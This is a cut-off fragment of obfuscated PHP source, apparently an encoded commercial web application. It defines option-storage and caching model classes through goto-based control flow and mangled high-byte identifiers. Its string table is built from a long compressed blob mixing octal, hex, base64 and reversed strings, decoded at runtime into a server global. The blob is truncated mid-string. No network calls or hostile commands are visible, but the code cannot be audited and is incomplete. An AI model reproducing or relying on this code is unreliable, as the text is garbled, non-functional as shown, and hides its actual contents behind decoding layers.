$this->optionsValue($c¼®‡ôãéê); $c³ªªàŒñ® = parent::select($CÁŸ´íóğÛ); if (!$c³ªªàŒñ®) { continue; } if (is_null($d®æ˜‡œØ›)) { $d®æ˜‡œØ› = array(); } $d®æ˜‡œØ› = array_merge($d®æ˜‡œØ›, $c³ªªàŒñ®); } goto Fá“àĞÛ; Fá“àĞÛ: return $d®æ˜‡œØ›; goto bê³·‚…±ù; F¤Åâ¦Æ¥Ì: $AªÒå‘Ä·Ë = $this->findWhereField($c¼®‡ôãéê); if (!$AªÒå‘Ä·Ë || isset($c¼®‡ôãéê[$C©Ú­ö×—£[280]]) || isset($c¼®‡ôãéê[$C©Ú­ö×—£[340]])) { return parent::select($CÁŸ´íóğÛ); } $F™îİ× = $c¼®‡ôãéê[$C©Ú­ö×—£[263]][$AªÒå‘Ä·Ë][1]; goto BÆ‹ˆ‡µËä; FÔ´Ö†µš§: $C©Ú­ö×—£ =& $_SERVER[í™]; $CïøÙÇ“¤¯ = self::SQL_WHERE_IN_CHUNK; $c¼®‡ôãéê = $this->optionsValue(); goto F¤Åâ¦Æ¥Ì; bê³·‚…±ù: } public function delete($f¢º¯˜¿Âì = array()) { goto eÏŞ¹¼Ò¼·; D¶Â„§©’÷: return $bŞñˆàŸÙÙ; goto A¥Óé®™˜; F­ÀÓÌ…‰¼: $eÑğèƒ°©Ş = $fÂºÉ™®º[$BÑÏ†¾ÂøÇ[263]][$eÕ‚­ŸºÜË][1]; $eÑğèƒ°©Ş = is_array($eÑğèƒ°©Ş) ? $eÑğèƒ°©Ş : array(); for ($eºšËÄ°ˆî = 0; $eºšËÄ°ˆî < count($eÑğèƒ°©Ş); $eºšËÄ°ˆî += $a½·„‘İ‚ğ) { $E·îÍÆ¸† = array_slice($eÑğèƒ°©Ş, $eºšËÄ°ˆî, $a½·„‘İ‚ğ); if (!is_array($E·îÍÆ¸†) || count($E·îÍÆ¸†) == 0) { break; } $fÂºÉ™®º[$BÑÏ†¾ÂøÇ[263]][$eÕ‚­ŸºÜË][1] = $E·îÍÆ¸†; $this->optionsValue($fÂºÉ™®º); $bŞñˆàŸÙÙ += parent::delete($f¢º¯˜¿Âì); } goto D¶Â„§©’÷; B×®äºĞ­: $eÕ‚­ŸºÜË = $this->findWhereField($fÂºÉ™®º); if (!$eÕ‚­ŸºÜË) { return parent::delete($f¢º¯˜¿Âì); } $bŞñˆàŸÙÙ = 0; goto F­ÀÓÌ…‰¼; eÏŞ¹¼Ò¼·: $BÑÏ†¾ÂøÇ =& $_SERVER[í™]; $a½·„‘İ‚ğ = self::SQL_WHERE_IN_CHUNK; $fÂºÉ™®º = $this->optionsValue(); goto B×®äºĞ­; A¥Óé®™˜: } private function findWhereField($DŒ÷˜‹ï·í) { $bïŠñêğ§¯ =& $_SERVER[í™]; $f•‘áÀƒœ² = self::SQL_WHERE_IN_CHUNK; if (!is_array($DŒ÷˜‹ï·í) || !is_array($DŒ÷˜‹ï·í[$bïŠñêğ§¯[263]])) { return !1; } foreach ($DŒ÷˜‹ï·í[$bïŠñêğ§¯[263]] as $CœáàáŠÓ => $d±ÔÌ‘íßØ) { if (is_array($d±ÔÌ‘íßØ) && isset($d±ÔÌ‘íßØ[0]) && is_string($d±ÔÌ‘íßØ[0]) && strtolower($d±ÔÌ‘íßØ[0]) == $bïŠñêğ§¯[7] && is_array($d±ÔÌ‘íßØ[1]) && count($d±ÔÌ‘íßØ[1]) > $f•‘áÀƒœ²) { ignore_timeout(); return $CœáàáŠÓ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\117\x70\x74\x69\157\156"; public $field = array(); public function listData($c¡É—¹Ôæá = false, $cšì©˜·ÈÀ = "\155\x6f\144\151\x66\171\124\x69\155\x65", $fŸŞÊÄæ = false) { $fäÎ¼Ã­— = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$fäÎ¼Ã­—) { return $c¡É—¹Ôæá ? null : array(); } if (!$c¡É—¹Ôæá) { $fäÎ¼Ã­— = array_filter(array_values($fäÎ¼Ã­—)); return array_sort_by($fäÎ¼Ã­—, $cšì©˜·ÈÀ, $fŸŞÊÄæ); } return $fäÎ¼Ã­—[$_SERVER[í™][364] . $c¡É—¹Ôæá]; } public function insert($D„ßŠÒÍŒ™) { goto a²ÚÓîº¼ ; a…Í‡Õàä·: return $E•Œ¸…ŒÇÚ; goto dÜôÃ…â; a²ÚÓîº¼ : $Fœ‹¾¼Ô¨ =& $_SERVER[í™]; $D„ßŠÒÍŒ™ = array_field_key($D„ßŠÒÍŒ™, $this->field); $E•Œ¸…ŒÇÚ = Model($this->modelType)->get($Fœ‹¾¼Ô¨[365], $this->optionType . $Fœ‹¾¼Ô¨[366]); goto FÊÎ—ãÕ§Š; FÊÎ—ãÕ§Š: $E•Œ¸…ŒÇÚ = $E•Œ¸…ŒÇÚ ? $E•Œ¸…ŒÇÚ : 0; $D„ßŠÒÍŒ™[$Fœ‹¾¼Ô¨[367]] = ++$E•Œ¸…ŒÇÚ; $D„ßŠÒÍŒ™[$Fœ‹¾¼Ô¨[187]] = time(); goto e¨ºÄˆÕ; e¨ºÄˆÕ: $D„ßŠÒÍŒ™[$Fœ‹¾¼Ô¨[107]] = time(); Model($this->modelType)->set($Fœ‹¾¼Ô¨[365], $E•Œ¸…ŒÇÚ, $this->optionType . $Fœ‹¾¼Ô¨[366]); Model($this->modelType)->set($Fœ‹¾¼Ô¨[364] . $E•Œ¸…ŒÇÚ, $D„ßŠÒÍŒ™, $this->optionType); goto a…Í‡Õàä·; dÜôÃ…â: } public function update($e‘†œ‹óÙƒ, $aˆš•Ñ¦êÙ) { goto e¶ÜÏÈ³Õ; e¶ÜÏÈ³Õ: $dâÔ¼‡­ô› =& $_SERVER[í™]; $aˆš•Ñ¦êÙ = array_field_key($aˆš•Ñ¦êÙ, $this->field); $Aš¯Û¦ˆ˜ = $this->listData($e‘†œ‹óÙƒ); goto A’Ø¤Êàä¤; A’Ø¤Êàä¤: if (!$Aš¯Û¦ˆ˜) { return !1; } $aˆš•Ñ¦êÙ = array_merge($Aš¯Û¦ˆ˜, $aˆš•Ñ¦êÙ); $aˆš•Ñ¦êÙ[$dâÔ¼‡­ô›[107]] = time(); goto CÆ–½µğ¹ñ; CÆ–½µğ¹ñ: return Model($this->modelType)->set($dâÔ¼‡­ô›[364] . $e‘†œ‹óÙƒ, $aˆš•Ñ¦êÙ, $this->optionType); goto a©– ƒŞ; a©– ƒŞ: } public function remove($fçß·ÎÓé) { return Model($this->modelType)->remove($_SERVER[í™][364] . $fçß·ÎÓé, $this->optionType); } public function clear() { $b¤‹ÙëÛ« =& $_SERVER[í™]; Model($this->modelType)->remove($b¤‹ÙëÛ«[365], $this->optionType . $b¤‹ÙëÛ«[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($f©İÍ‡Û¾Â, $EÖÍ¬²½) { if (!$EÖÍ¬²½) { return !1; } $fá§á³¦ñ = $this->listData(); $fá§á³¦ñ = array_to_keyvalue($fá§á³¦ñ, $f©İÍ‡Û¾Â); return isset($fá§á³¦ñ[$EÖÍ¬²½]) ? $fá§á³¦ñ[$EÖÍ¬²½] : !1; } public function findByName($a¸ù´„Œò) { return $this->findByKey($_SERVER[í™][28], $a¸ù´„Œò); } protected function resetData($Eºà…ö‰) { $fè´í¶ÓÈ˜ =& $_SERVER[í™]; $Eºà…ö‰ = is_array($Eºà…ö‰) ? $Eºà…ö‰ : array(); $Aö½†­áÚ‘ = array(); for ($b²µš¿ĞŒ– = 0; $b²µš¿ĞŒ– < count($Eºà…ö‰); $b²µš¿ĞŒ–++) { $Aö½†­áÚ‘[$fè´í¶ÓÈ˜[364] . $Eºà…ö‰[$b²µš¿ĞŒ–][$fè´í¶ÓÈ˜[367]]] = $Eºà…ö‰[$b²µš¿ĞŒ–]; } return Model($this->modelType)->set($Aö½†­áÚ‘, !1, $this->optionType); } private function getAutoName($f öùî†´) { $aÈÓ¯øª‚Î = array_to_keyvalue($this->listData(), $_SERVER[í™][28]); if (!$aÈÓ¯øª‚Î || !isset($aÈÓ¯øª‚Î[$f öùî†´])) { return $f öùî†´; } for ($cĞ­ˆ¡°Ç‡ = 1; $cĞ­ˆ¡°Ç‡ < count($aÈÓ¯øª‚Î); $cĞ­ˆ¡°Ç‡++) { $eä¥¶›œçœ = $f öùî†´ . "\x28{$cĞ­ˆ¡°Ç‡}\51"; if (!isset($aÈÓ¯øª‚Î[$eä¥¶›œçœ])) { return $eä¥¶›œçœ; } } return $eä¥¶›œçœ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($b‹„ÁÍå¤ = false, $a±¶Âñííò = '', $d‘¿ä”ô = false) { goto AÅáŒãÃó®; CÓ›éãšŸÀ: $this->cacheSet($a±¶Âñííò, $Eæ†ŞÀ¦Ø); $Eæ†ŞÀ¦Ø = array_merge($DßÆ³‡ùä, $Eæ†ŞÀ¦Ø); return $b‹„ÁÍå¤ ? $Eæ†ŞÀ¦Ø[$b‹„ÁÍå¤] : $Eæ†ŞÀ¦Ø; goto CŞ¯††Êï; dµíÅÈ¿Îô: $DßÆ³‡ùä = is_array($DßÆ³‡ùä) ? $DßÆ³‡ùä : array(); if (is_array($Eæ†ŞÀ¦Ø)) { $Eæ†ŞÀ¦Ø = array_merge($DßÆ³‡ùä, $Eæ†ŞÀ¦Ø); return $b‹„ÁÍå¤ ? isset($Eæ†ŞÀ¦Ø[$b‹„ÁÍå¤]) ? $Eæ†ŞÀ¦Ø[$b‹„ÁÍå¤] : null : $Eæ†ŞÀ¦Ø; } $c‰ß‰×Æˆ÷ = $this->filterWhere(array($D“’ğ±Çéã[29] => $a±¶Âñííò)); goto f¦–»à…®ì; f¦–»à…®ì: $Eæ†ŞÀ¦Ø = $this->where($c‰ß‰×Æˆ÷)->select(); $Eæ†ŞÀ¦Ø = array_to_keyvalue($Eæ†ŞÀ¦Ø, $D“’ğ±Çéã[89], $D“’ğ±Çéã[359]); foreach ($Eæ†ŞÀ¦Ø as $F‡¦æˆÓõ => $aÅÈÙÇ¡œë) { if ($d‘¿ä”ô || in_array($F‡¦æˆÓõ, $this->jsonField)) { $Eæ†ŞÀ¦Ø[$F‡¦æˆÓõ] = json_decode($aÅÈÙÇ¡œë, !0); } } goto CÓ›éãšŸÀ; AÅáŒãÃó®: $D“’ğ±Çéã =& $_SERVER[í™]; $Eæ†ŞÀ¦Ø = $this->cacheGet($a±¶Âñííò); $DßÆ³‡ùä = $this->optionDefault($a±¶Âñííò); goto dµíÅÈ¿Îô; CŞ¯††Êï: } public function set($a÷·„øÀºó, $Eó§êßŞ‹‹ = false, $fÂ¾ÂºíÖé = '') { goto a¬¸µ´ªø±; F‰éÚõ¶˜: return $this->addAll($A‹Ï¬ñî±¹, array(), !0); goto b•Ó†¿æç; a¬¸µ´ªø±: $bê‡©¿¹¡æ =& $_SERVER[í™]; $this->cacheRemove($fÂ¾ÂºíÖé); $A‹Ï¬ñî±¹ = array(); goto a·ÓÉ…îÆ³; a·ÓÉ…îÆ³: $Aš’ñÕ¸Ş = is_array($a÷·„øÀºó) ? $a÷·„øÀºó : array($a÷·„øÀºó => $Eó§êßŞ‹‹); foreach ($Aš’ñÕ¸Ş as $fŞİ“ì”¯ => $d¥÷°æ½’ö) { if (is_array($d¥÷°æ½’ö)) { $d¥÷°æ½’ö = json_encode_force($d¥÷°æ½’ö); } $this->checkLength($d¥÷°æ½’ö, !1, $this->tableName . $bê‡©¿¹¡æ[4] . $a÷·„øÀºó); $d¥÷°æ½’ö = self::textEncode($d¥÷°æ½’ö); $Aš’ñÕ¸Ş = array($bê‡©¿¹¡æ[29] => $fÂ¾ÂºíÖé, $bê‡©¿¹¡æ[89] => $fŞİ“ì”¯, $bê‡©¿¹¡æ[359] => $d¥÷°æ½’ö); $A‹Ï¬ñî±¹[] = $this->filterWhere($Aš’ñÕ¸Ş); } if (!$A‹Ï¬ñî±¹) { return !0; } goto F‰éÚõ¶˜; b•Ó†¿æç: } protected function optionDefault($C‚›¾¢´¸½ = '') { return !1; } public function setDeep($a“×‡æ›­Ó, $føÖ©Â½Áæ = false, $b–Ñ¹»áöò = '') { $bñ‡¡Œ”¿ù = explode($_SERVER[í™][91], $a“×‡æ›­Ó); $eİÒ„¿èõÑ = $this->get(); array_set_value($eİÒ„¿èõÑ, $a“×‡æ›­Ó, $føÖ©Â½Áæ); $this->set($bñ‡¡Œ”¿ù[0], $eİÒ„¿èõÑ[$bñ‡¡Œ”¿ù[0]], $b–Ñ¹»áöò); } public function remove($FŞ¡‚ÚÔÍÛ, $aÌ¨‚è—Ãš = '') { $a·Ê¬†·çâ =& $_SERVER[í™]; $this->cacheRemove($aÌ¨‚è—Ãš); $dë•ë“Îˆ« = $this->filterWhere(array($a·Ê¬†·çâ[89] => $FŞ¡‚ÚÔÍÛ, $a·Ê¬†·çâ[29] => $aÌ¨‚è—Ãš)); if (is_null($FŞ¡‚ÚÔÍÛ)) { unset($dë•ë“Îˆ«[$a·Ê¬†·çâ[89]]); } return $this->where($dë•ë“Îˆ«)->delete(); } public function cacheSet($AÑ°ë‘¢„, $BÆã«½œ°à = false) { return Cache::set($this->cacheKey($AÑ°ë‘¢„), $BÆã«½œ°à); } public function cacheGet($càáŠ¨ã¯ï) { return Cache::get($this->cacheKey($càáŠ¨ã¯ï)); } public function cacheRemove($Cš¸¬“Â›) { return Cache::remove($this->cacheKey($Cš¸¬“Â›)); } protected function filterWhere($A¬İ‘õœ ) { return $A¬İ‘õœ ; } protected function cacheKey($C¤œ‘Õİœ) { return $C¤œ‘Õİœ; } } goto f¹öÀ…¸®”; B‹¤¦±Şõ: if (!function_exists('_kodDe')) { function _kodDe($E¤§çÑŞØ) { $E¤§çÑŞØ = base64_decode($E¤§çÑŞØ); $aÂÅ•‹§Æ£ = strlen($E¤§çÑŞØ); $Eßµòİô‡– = ''; $dÑÃÒËÎÙ = ord($E¤§çÑŞØ[0]) - 30; for ($f¹Ê«ôñì = 1; $f¹Ê«ôñì < $aÂÅ•‹§Æ£; $f¹Ê«ôñì += 2) { if ($f¹Ê«ôñì + 1 < $aÂÅ•‹§Æ£) { $Eßµòİô‡– .= chr(ord($E¤§çÑŞØ[$f¹Ê«ôñì + 1]) + $dÑÃÒËÎÙ); $Eßµòİô‡– .= chr(ord($E¤§çÑŞØ[$f¹Ê«ôñì]) + $dÑÃÒËÎÙ); } else { $Eßµòİô‡– .= chr(ord($E¤§çÑŞØ[$f¹Ê«ôñì]) + $dÑÃÒËÎÙ); } } return $Eßµòİô‡–; } } define("\355\231", "\302\325\316\303\301"); $_SERVER[í™] = explode("\174\1\174\4\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\140\33\305\325\60\367\221\102\241\220\162\24\132\26\47\41\266\243\303\127\56\307\107\144\113\266\105\154\113\110\162\234\304\162\224\225\264\222\326\226\264\362\356\112"."\266\163\224\233\162\64\34\345\52\67\341\152\70\32\256\220\162\24\50\345\56\320\322\102\240\24\12\375\200\44\100\241\64\234\345\376\347\236\331\225\14\355\117\353\150\346\315\233\331\71\336\274\171\63\363\336\233".base64_decode('nee+vnbXtXus3f2Jz//ywT04iP63Jw4fddY+u6D/ds8d1xfYrf7A1sPcX0/rv3K/ma+esatn+bWO').base64_decode('sfmuCfXYRU/Nu6D/udKM+q8nBm+4bc7Rl310/5N/vOyc+e/uuOmzTa8FTzqm9tkLRjqjH/zuxVd2')."\xf7\xed\x7e\x52\xdb\x89\x5b\x3f\xee\x3a\xfc\xf5\xb3\xbe\xbf\xe3\x85\x4f\x72\x4a\xcd\x5f\xef\x2a\x1e\xf0\xd1\xb2\x8e\xcc\xbf\xd6\x5d\xf6\xc2\x47\xfb\x7d\xff\xae\xbd\xe6\xff\xe7\xb5\x77\x1c\x7\x5c\xde\xd9\x7d\xc1\xab\x43\x27\x1d"."\355\171\357\241\217\57\74\357\266\163\216\277\347\300\177\254\73\173\250\256\376\321\301\253\347\236\334\272\317\231\153\366\330\373\317\261\253\16\33\74\372\221\213\74\357\355\362\317\3\307\117\10\156\230\371\165\313"."\x33\x7f\xda\x7c\xc0\xe3\xca\xcc\xcd\x9f\xfc\xe0\xa9\x94\xfa\xd0\xca\x3b\xcc\x3f\x6e\x57\xff\x78\xc3\x53\x33\x47\x5e\xc\x5e\x73\xf2\x2d\x37\x9d\xfc\xc8\xad\x99\x7f\x4c\x5c\x30\xeb\x9c\x6c\xfd\x1f\xd2\xd3\x1f\x3c\x26\x31\xcf\xff"."\x6a\xcd\xc4\xc8\xb1\xef\xbc\xba\xf9\xe3\xd\xff\xf8\x63\xf5\xc1\xef\x5f\xb8\xe7\xaf\xbc\x97\x17\xcf\xf6\x9c\xb1\xe0\x89\x3d\x6e\xd9\xfd\xa1\xdd\x1f\x79\xe9\xfd\x7d\xf2\xfb\x1c\xe6\xbe\xf0\xb4\xe7\x3e\xde\xeb\xb7\xdf\xdf\x78\xde"."\x53\x2f\x7c\xfa\xa7\xeb\xef\x7a\xfd\xeb\x87\x3f\x8c\xcf\x7d\x77\xa4\xe1\xe3\xfd\x2f\x3e\xe4\xed\xa7\x77\x1c\xdd\x54\xfa\xde\x6d\x9e\xd\xf2\xf\xe7\xdf\x71\xcf\x7\xb3\x9e\x91\xef\x3c\xfb\xb6\xf7\xce\xf5\x26\xb6\x54\xff\xf0\xca".base64_decode('Q/Z8YE600XX3zK/2PH/56Rc8ttsuu+D+bcY/Ul4zJWVCNUwDAxJaPqWmcVjN4183/jHGsqqp4HCs')."\77\20\211\205\7\202\101\137\50\22\43\45\212\351\71\55\111\102\5\131\227\163\244\360\202\242\33\340\123\142\161\261\202\126\120\362\26\10\7\44\145\123\216\313\6\51\311\333\21\363\372\202\275\201\345\261\310"."\xf2\xa0\x8f\x60\xc4\x63\x63\x45\x45\x9f\xc4\x31\x14\xc\x9b\xb2\x6e\x46\xd4\x9c\xc2\x30\xc6\x75\x56\xaf\xe\x5f\xb7\xbf\x5f\x8a\x84\x3c\xfd\x61\x4f\x67\xc4\x1f\xe8\xc7\xe0\xce\x40\x5f\x9f\x3f\x52\xe\xf\x5\x7a\x7b\x3b\x3c\x9d"."\113\312\123\202\41\117\167\237\107\2\365\313\52\61\65\237\322\252\245\125\70\145\225\124\203\3\135\252\222\115\342\140\136\246\325\61\47\13\44\24\141\41\60\6\371\142\66\213\43\375\54\104\352\257\244\344\142"."\x96\xf4\x99\x57\x8c\x14\x74\x35\x27\xd3\xa6\x2f\x51\x26\x19\x14\x7\xe4\xa2\xa9\xa9\xf9\x4\x8e\xf8\x26\x4c\x5d\xe6\x70\x50\xe3\x84\xae\xe4\x94\x3c\x29\x2a\xec\xeb\xf5\x75\x46\x24\x58\x4d\xa9\x2b\x14\xe8\x93\xc8\x50\xe4\x64\xc3"."\124\164\151\260\307\27\362\111\260\352\255\263\121\213\147\113\70\337\100\77\350\20\311\323\333\53\115\125\202\251\344\12\264\30\234\247\102\141\201\220\327\27\222\72\226\113\274\237\22\132\56\247\345\135\240\24\60".strrev('¼ÔÇ€„«ò“gŠ:Ä¤[9%c5•2X–¥BF“P^¸î4ŒXû'."\n".'êè$t8~½ÁB„(_UP¦').base64_decode('WiTESorQNDZzSKBIsRUKyYFsGplTYIKVcLC1Df8uIkjxGExTdDOm5BNaUs2TadhOphwhPNnMeHUV').strrev('&˜«³'."\r".'¿9:u&ÍFDÑaDNbşîBÕÔcHSdxó¢¤ÙiK,ÙzUš”†Ò%iöL+BW5‘à')."\x68\x86\x41\x6b\x3a\x50\xc8\x6a\x72\x32\xac\xe8\x42\xed\xbb\x40\x31\x81\xa2\x29\x2\x8b\x8\xad\x4b\xd3\x73\x5e\xc0\x0\x48\xef\x0\xb2\x57\x7\x2a\x24\x8c\x52\xc2\x4f\xa\x9d\xe2\x22\x8c\xab\x7a\xe8\x44\xe7\xd7\xc3\x43\x8b\xc1"."\x3f\x35\x84\x8b\x45\x49\xd5\x32\x4a\x36\x1b\x53\x26\x14\x32\x41\x72\xc9\xb9\x6\xad\xbd\xdb\x88\xab\x79\x37\x80\xe0\xa8\x3f\x10\xcb\xc8\x46\xa6\x2f\x39\x37\x86\x72\x51\xe6\x98\x54\x26\x5c\x85\x4c\x81\xcc\x61\x36\x6d\xa3\x16\x2".base64_decode('hv3dr5k+gcVmtYScFVuKwxnTLISVfBJ2CGmRNp5HHVZQFILkdUhJqU9aLvU0q82UugCtpCY5x8uY').strrev('$Z«JLŠêa§LTÂZİåª¦ÈMVB…as”ÍµğÁÖFD¢ÒIÒL&W*‰¡æ€Á˜2ÖÑ,¹').base64_decode('QYqAM7gW56Kzp1PLm2D6OiO6nDdSiu70EfJulkA/Mw5G0byqUdAMFX6mWZJNU05k4Oznxbd+C76a')."\xcf\xaa\x79\xa5\xc\xd7\x93\x48\x28\x86\xe1\x84\x59\x74\x2d\xeb\xf4\x64\xb3\xda\xb8\x33\xa0\xab\x69\x15\xe4\xa9\xb5\x55\x13\x70\xa6\x66\x89\xb2\xcd\x82\xaa\x2b\x6\x8d\x4a\xdd\x7d\x11\x82\xc\x6a\xa5\x38\x83\xba\x9c\xce\xc9\xcd"."\x52\xa1\x18\x7\x3d\x43\xe6\x67\x5\x18\xc6\x26\x5f\x6f\x96\x12\x30\xea\x90\x72\x45\xc3\x74\xea\xa\x60\x3f\x2a\x58\xe8\xc8\xe0\xf9\x53\xce\x3e\x38\x9e\xaa\x92\x74\x86\x1\x97\x26\xe0\xc6\xba\x26\x9\x90\x91\x44\xd3\x30\xb4\x27"."\22\11\306\374\135\140\61\356\367\305\372\74\221\316\36\122\155\123\116\323\72\367\2\336\313\212\244\300\145\116\60\345\40\241\365\203\76\342\300\240\66\256\350\340\303\35\223\315\322\250\226\214\153\23\56\232\4"."\x91\xc3\x80\x4b\x50\x64\xd8\xa3\x5\xd3\x19\x92\xf3\x69\xd8\x3f\xf1\x49\x53\x21\xe4\x68\x94\xd2\xd6\xe\xed\x55\xf2\x69\x33\x43\x33\x86\x7d\xa1\xa5\xbe\x50\x2c\x1c\xe8\x8a\xc\x7a\x42\x64\x19\xcf\x83\x81\x98\xa0\x9f\x82\x45\x67"."\235\41\45\11\272\76\141\322\174\162\1\366\32\305\201\23\5\216\61\115\205\223\207\246\365\372\273\141\307\170\235\6\100\162\212\130\264\354\136\65\247\302\272\233\54\5\365\44\130\343\273\111\205\334\250\101\255"."\321\114\155\165\64\71\247\306\11\376\255\255\31\212\172\135\265\303\355\156\225\347\161\327\273\352\245\206\272\171\122\20\10\35\252\234\225\110\243\313\60\352\244\300\222\157\351\0\270\46\11\323\334\326\165\30\30"."\xf2\x1d\x37\xe0\xb\x47\x62\x7d\xbe\x48\x4f\xc0\x4b\xbe\xe0\xf3\x90\x50\xaf\x86\xa7\x26\x6d\xd1\x10\xfe\x19\x26\x23\x8\x44\x85\xb4\x92\xd0\xb2\x9a\x2e\x67\x21\x3\xa2\xf4\xa6\x50\x26\x90\x56\x53\x9c\xaf\xfb\x81\x40\x43\x3a\x16"."\163\76\36\11\253\271\2\145\120\146\246\230\213\13\101\67\57\201\320\2\30\62\306\226\64\266\6\151\72\11\65\273\111\226\131\15\135\224\331\272\303\215\340\377\234\263\46\265\234\114\45\121\64\161\225\44\236".strrev('8O [¡*RWA^u‰Uâ—(Q”½¡VJ“-hİY*Ğ­9úFŒÌSéAn¨A©º™¨¾dQéIkT¹')."\347\302\252\21\2\231\240\174\103\343\203\120\14\345\0\223\63\154\331\340\114\37\106\204\225\271\153\240\267\67\326\31\350\217\0\121\24\103\6\103\376\210\217\122\204\307\33\363\164\6\331\22\306\207\211\40\300"."\xe9\x59\xce\xde\x30\xa4\xd4\x20\xf0\x7d\xbe\x40\x70\x96\x4b\x17\x3a\xc8\x52\x71\x18\xf0\xc2\x82\x96\x37\x14\x67\x82\x94\x96\xe4\xcc\x17\x63\x2c\xb2\x71\xde\xb2\x1c\x5c\x0\x9e\x70\xca\xb9\xd5\xce\x9c\x62\xca\x4e\x56\x75\xeb\xfa".base64_decode('JkXEZdJPhoAzyyxYVMH+gi6swUCYZGiHUCCNxBWd1CM4QJJywvB3+whwGl0bZSK5eAbDlNEVAb6u').base64_decode('rpZ5G9tpfUjZE7ksF7BiqmX8Ylp8BHAxQHRypVY7+VhFevz9S2J9Aa+vN+bvB1wiUg4fCHo9dPBF')."\170\107\40\322\143\201\16\0\76\261\324\323\353\267\243\373\226\371\303\221\160\305\44\0\33\360\331\122\300\226\53\30\362\165\371\227\261\150\227\337\327\353\15\307\72\75\235\75\34\247\337\323\107\42\261\24\334"."\364\30\156\53\176\14\60\274\60\333\72\305\112\160\33\110\73\63\146\331\247\304\250\4\36\343\164\2\26\57\205\320\46\151\56\334\174\242\226\20\231\70\241\25\51\265\62\41\56\107\31\104\116\46\63\124\246"."\13\123\65\376\251\221\74\141\311\54\304\30\53\210\117\262\40\152\6\215\3\161\215\174\137\42\314\267\254\6\61\210\323\241\244\64\135\371\66\200\47\145\62\302\260\305\301\274\341\151\140\4\74\150\227\13\50"."\1\215\110\214\316\105\3\354\17\74\264\72\51\276\303\214\5\300\126\334\3\367\247\261\301\120\240\277\233\144\30\317\50\264\2\176\322\375\325\124\230\41\333\124\223\263\44\40\211\310\134\250\244\235\76\242\321"."\xae\x5c\x8b\x7f\x8e\xc1\x3f\x40\x78\x23\x1f\x57\xf2\xb4\xd7\xe3\x90\x31\x33\xc6\x41\xf7\x20\x60\xb6\x50\xa6\xaa\x15\xd9\xd7\xe2\x9a\x96\xa5\xf3\x18\xac\xc7\x8c\x5f\xb0\xd\xee\x88\x41\x89\x64\x82\x32\xa7\x39\x74\xd5\x22\x8b\x43".base64_decode('JLDE1x+jlIVjAjViANgyBkKkQ0xtlG5gcGLIF6ZcQFfGiirtLrdrDqFiBaw/5PPuldHxOdVDzjmu')."\x61\x10\xa8\xa9\x5d\x8c\xa3\x24\x16\x75\x59\xa2\x33\x49\xfe\xa2\xce\x72\x43\x31\xa5\xda\x68\xaf\x69\x8e\xba\xa3\xee\xea\xf6\xe6\x21\x8f\x73\xb5\xec\x5c\x5d\xe7\x5c\xe8\x1c\x9e\x13\x75\xd5\xcc\x21\x80\xe1\x35\xd\x8e\xa6\x75\x10"."\x1\x20\xb6\xcf\x18\x6\x3f\xad\xd1\xf6\x59\x51\xe7\x31\x3f\x5d\xb5\x78\x28\x3a\x3c\xbb\x79\xce\xd1\x51\xd7\x8c\xe8\xf8\x70\x6d\x4d\x3b\xfd\x4e\xa2\xa8\x83\xcd\x59\x62\x92\x55\x35\x39\xa7\x1a\x54\x9\x88\x2f\xc\x25\x8f\x58\xa2".base64_decode('gEATVqsFDl0zbx2FgzFU0jzHkDM6Z7hdyCeA7N8CogvgzxmG53GugC1jWeG8J/RRzCc4d4XzIi4n')."\10\37\120\323\171\66\205\300\202\316\66\305\126\251\171\315\54\374\273\216\16\144\132\241\313\62\74\317\322\11\165\26\363\352\30\335\352\347\225\61\22\320\114\112\337\161\305\34\127\50\171\0\270\45\16\210\203"."\x6e\xdb\x40\x92\x10\xcb\x22\x21\x8d\x7c\x81\x6f\x97\x14\xb4\x77\x20\xad\x28\xc4\xa0\xd8\x35\xce\x62\x49\x25\x4f\xc6\x69\x5f\x82\x6d\x24\xe4\x82\x12\x16\x5a\x18\x8b\x45\x3c\x1d\xbd\xbe\x18\xe5\x30\x84\x13\xd3\x38\xe2\x8a\x1d\xec".base64_decode('cAw0jXNUyh8SXGQ2xrISYgaSouua3owO/oxiAcpiYNdkgv6UwFZaam2TcDcTLhETO70gU2kC7m6Z')._kodDe('KdV5g6OAOz84bWcF/eGnAkFepExRmjhsWfEJGDx0jQ+G7QwO7cs1jT+2YTAif5QDJqD9g7UpDqKSqA==').base64_decode('EM6lVlMz5SxDg2kRCKHchq7VZI+OB7CXMyG4Ogund4hD9rOjKXbiIBwcAZhDiOJ/W6som86DidDJ').base64_decode('Fym/10kG0bPM6ScCPAuoVNSUwXQ2KdTQinpCYTgWIcOUdbBmcckOymDC8SKouQOeQzjgmuoA0p4D').strrev('hh9FĞwµ ë%%*÷úàtVy'."\r".'ÀÌÙÖ‰(¹Q/'."\r".'Pëß “¥àêXˆ:&GàêÄ¸8÷')."\xbf\xe1\x25\xb5\x19\x0\xf4\x41\x6a\x83\x82\x80\x49\x64\x1c\x70\x38\xe0\xd8\xd2\x52\x60\x90\x76\x3\x13\xaa\x1d\x5c\xe0\x76\xa4\x75\xad\x58\x8\xd2\x2f\x9\x31\x5c\x19\x2\xe0\x35\x65\x80\x90\xa6\x99\xe\xba\x1\x62\x81\x3e\xc6"."\x81\x60\x75\x78\x68\x29\x1f\x70\x5e\x7b\xb6\x7c\x92\x26\xe0\xb8\xbd\xe\x18\xa\xd3\xbb\xe4\x92\x38\xc0\x15\x7\x3b\x6f\x25\xc\x7e\x4a\xca\x4f\xf3\xb8\xb8\x64\xdf\x88\xd8\x8f\x87\x78\x27\xf2\x4a\x44\xe4\x74\x58\xf8\xbc\x29\xa7".base64_decode('6bcrpOJwSElMJvjmxivslqwxNvSIDisRU+WhZwTCaG3avvtSyuZ0RMjHQmxTUjdvU6DAVxzIEMKA')."\17\12\123\236\202\2\234\303\24\311\12\51\33\11\52\313\214\323\173\12\205\302\204\372\323\326\133\312\205\121\76\63\151\23\45\130\200\103\340\331\160\164\234\174\210\205\50\371\121\265\30\356\327\130\216\355\54"."\130\107\333\230\21\354\367\240\232\237\124\363\342\336\235\103\71\317\343\104\1\311\233\307\160\37\117\25\306\274\205\237\15\70\310\231\201\3\354\33\107\5\256\307\367\270\240\366\60\253\120\167\122\222\255\346\164"."\2\72\255\121\76\37\7\30